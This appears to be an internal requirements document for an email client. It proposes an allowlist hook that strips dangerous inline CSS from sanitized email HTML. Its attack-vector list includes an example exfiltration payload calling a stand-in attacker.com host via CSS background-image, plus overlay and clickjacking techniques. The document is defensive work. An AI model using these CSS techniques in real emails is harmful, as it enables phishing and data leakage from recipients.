# PRD-014: Malicious CSS in Emails Can Break Layout

## Status
Done

## Priority
P0-Critical

## Category
Security — Fix Before Launch

## Source
GAP-FINDER S12

---

## Problem Statement
The HTML sanitizer (DOMPurify) allows the `style` attribute on all elements but performs no validation on the CSS values within those attributes. A malicious sender can craft CSS that covers the entire viewport (`position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 99999`), hides UI elements (`opacity: 0`), creates fake UI overlays for phishing, exfiltrates data via `background-image: url()`, or makes content invisible while keeping it interactive.

## Current Behavior
In `frontend/components/thread-view.tsx`, the `EmailMessage` component:
- Line 368-380: DOMPurify configuration:
  ```tsx
  ALLOWED_ATTR: [
      "href", "src", "alt", "style", "class", "target", "width", "height",
  ],
  ```
  - `style` is in `ALLOWED_ATTR` — any CSS in `style="..."` attributes passes through DOMPurify unchanged.
  - DOMPurify sanitizes HTML structure but does NOT validate or sanitize CSS values.

- Line 446-449: The sanitized HTML is rendered inside a container:
  ```tsx
  <div
      className="max-w-2xl text-[13px] leading-relaxed ..."
      dangerouslySetInnerHTML={{ __html: sanitizedHtml }}
  />
  ```

**Attack vectors via unrestricted CSS:**
1. **Layout breaking**: `position: fixed/absolute` with large dimensions covers the app UI.
2. **Phishing overlays**: Fake login forms or fake UI elements positioned over real ones.
3. **Content hiding**: `display: none` or `opacity: 0` on content that screen readers still read.
4. **Data exfiltration**: `background-image: url(https://attacker.com/leak?data=...)` — works as a tracking pixel via CSS (see PRD-013).
5. **Clickjacking within email**: `pointer-events: none` on legitimate content with interactive fake content above it.

## Expected Behavior
- CSS in `style` attributes should be validated and restricted to a safe subset.
- Dangerous CSS properties should be stripped:
  - `position` (fixed, absolute, sticky)
  - `z-index`
  - `-webkit-*`, `-moz-*` (vendor prefixes for experimental features)
  - `background-image` with `url()` (tracking vector)
  - `cursor` (custom cursors for social engineering)
  - `opacity` below a threshold
  - `pointer-events`
  - `content` (CSS content injection)
- Safe CSS properties to allow:
  - `color`, `background-color`, `font-size`, `font-weight`, `font-family`, `font-style`
  - `text-align`, `text-decoration`, `line-height`, `letter-spacing`
  - `margin`, `padding`, `border`, `border-radius`
  - `width`, `height`, `max-width`, `max-height` (with reasonable limits)
  - `display` (only `block`, `inline`, `inline-block`, `none` for quoted content)
  - `list-style-type`

## Files to Modify
- `frontend/components/thread-view.tsx:368-380` — Add a DOMPurify hook to sanitize CSS in style attributes:
  ```tsx
  const ALLOWED_CSS_PROPERTIES = new Set([
      'color', 'background-color', 'background', 'font-size', 'font-weight',
      'font-family', 'font-style', 'text-align', 'text-decoration',
      'line-height', 'letter-spacing', 'word-spacing',
      'margin', 'margin-top', 'margin-right', 'margin-bottom', 'margin-left',
      'padding', 'padding-top', 'padding-right', 'padding-bottom', 'padding-left',
      'border', 'border-radius', 'border-color', 'border-style', 'border-width',
      'width', 'height', 'max-width', 'max-height', 'min-width', 'min-height',
      'display', 'vertical-align', 'list-style-type', 'white-space',
      'overflow', 'text-overflow', 'word-break',
      'table-layout', 'border-collapse', 'border-spacing',
  ]);

  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
      if (node.hasAttribute('style')) {
          const style = node.style;
          const safeStyles: string[] = [];
          for (let i = 0; i < style.length; i++) {
              const prop = style[i];
              if (ALLOWED_CSS_PROPERTIES.has(prop)) {
                  const value = style.getPropertyValue(prop);
                  // Block url() in any value
                  if (!value.includes('url(')) {
                      safeStyles.push(`${prop}: ${value}`);
                  }
              }
          }
          if (safeStyles.length > 0) {
              node.setAttribute('style', safeStyles.join('; '));
          } else {
              node.removeAttribute('style');
          }
      }
  });
  ```
- Alternatively, remove `style` from `ALLOWED_ATTR` entirely and use CSS classes for email formatting. This is the most secure approach but may break legitimate email formatting.

## Impact Analysis

### What This Affects
- All email HTML rendering in the thread view.
- Legitimate emails with inline styles (common in HTML newsletters, marketing emails) — some styles may be stripped.
- Email formatting may appear slightly different for emails that rely on exotic CSS properties.

### What Affects This
- The DOMPurify configuration — hooks must be scoped to avoid global side effects.
- The email container's own CSS classes (`frontend/components/thread-view.tsx:447`) already apply some constraints (e.g., `max-w-2xl`), but inline styles can override them.

### Related PRDs
- PRD-013: Tracking Pixels — CSS `background-image: url()` is another tracking vector. The CSS sanitizer should block `url()` in property values.
- PRD-005: CSP Header — CSP with `style-src 'unsafe-inline'` allows inline styles. The CSS sanitizer provides the application-level protection.
- PRD-002: Header Injection — Both relate to sanitizing untrusted content from external sources.

## Implementation Notes
- The DOMPurify hook approach is the recommended path. It runs synchronously during sanitization, so there's no performance concern.
- Use a scoped DOMPurify instance to avoid polluting the global configuration:
  ```tsx
  const purify = DOMPurify(window);
  purify.addHook('afterSanitizeAttributes', cssHook);
  const sanitizedHtml = purify.sanitize(email.body_html, { ... });
  ```
- The allowlist approach (explicitly listing safe properties) is more secure than a denylist approach (blocking known-bad properties), because new CSS features could introduce new attack vectors.
- Testing is important: HTML newsletters from services like Mailchimp, SendGrid, and Resend use inline styles heavily. Verify that common email templates still render acceptably.
- The `dark:bg-white dark:text-black` container styles on line 447 provide some containment, but they can be overridden by `!important` in inline styles. The CSS sanitizer should strip `!important` from inline styles.
- Consider also adding `overflow: hidden` and `position: relative` to the email content container as a containment layer:
  ```tsx
  <div style={{ position: 'relative', overflow: 'hidden' }}>
      <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
  </div>
  ```
